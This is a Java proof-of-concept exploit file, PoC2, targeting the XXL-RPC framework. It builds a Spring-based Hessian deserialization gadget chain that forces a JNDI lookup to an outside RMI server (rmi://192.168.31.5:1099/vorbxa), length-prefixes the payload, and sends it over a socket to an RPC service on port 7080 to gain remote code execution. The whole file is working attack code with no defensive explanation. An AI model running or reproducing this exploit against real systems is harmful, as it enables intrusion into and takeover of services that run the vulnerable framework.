package com.xxl.rpc.core.poc;

import com.xxl.rpc.serialize.HessianSerializer;
import com.xxl.rpc.serialize.Serializer;
import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
import org.springframework.beans.factory.BeanFactory;
import org.springframework.jndi.support.SimpleJndiBeanFactory;

import java.io.OutputStream;
import java.net.Socket;

public class PoC2 {

    public static void main(String[] args) throws Exception {

        BeanFactory bf =  SpringUtil.makeJNDITrigger("rmi://192.168.31.5:1099/vorbxa");
        DefaultBeanFactoryPointcutAdvisor pcadv = new DefaultBeanFactoryPointcutAdvisor();
        pcadv.setBeanFactory(bf);
        pcadv.setAdviceBeanName("rmi://192.168.31.5:1099/vorbxa");

        DefaultBeanFactoryPointcutAdvisor pcadv2 = new DefaultBeanFactoryPointcutAdvisor();
        pcadv2.setAdviceBeanName("rmi://192.168.31.5:1099/vorbxa");
        Object obj = JDKUtil.makeMap(pcadv2, pcadv);

        HessianSerializer serializer = new HessianSerializer();
        byte[] bytes = serializer.serialize(obj);
        // serializer.deserialize(bytes, null);

        int length = bytes.length;
        byte[] newArray = new byte[length + 4];
        newArray[0] = (byte) ((length >> 24) & 0xFF);
        newArray[1] = (byte) ((length >> 16) & 0xFF);
        newArray[2] = (byte) ((length >> 8) & 0xFF);
        newArray[3] = (byte) (length & 0xFF);
        System.arraycopy(bytes, 0, newArray, 4, length);
        Socket socket = new Socket("127.0.0.1", 7080);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(newArray);
        outputStream.flush();
        outputStream.close();

    }

}
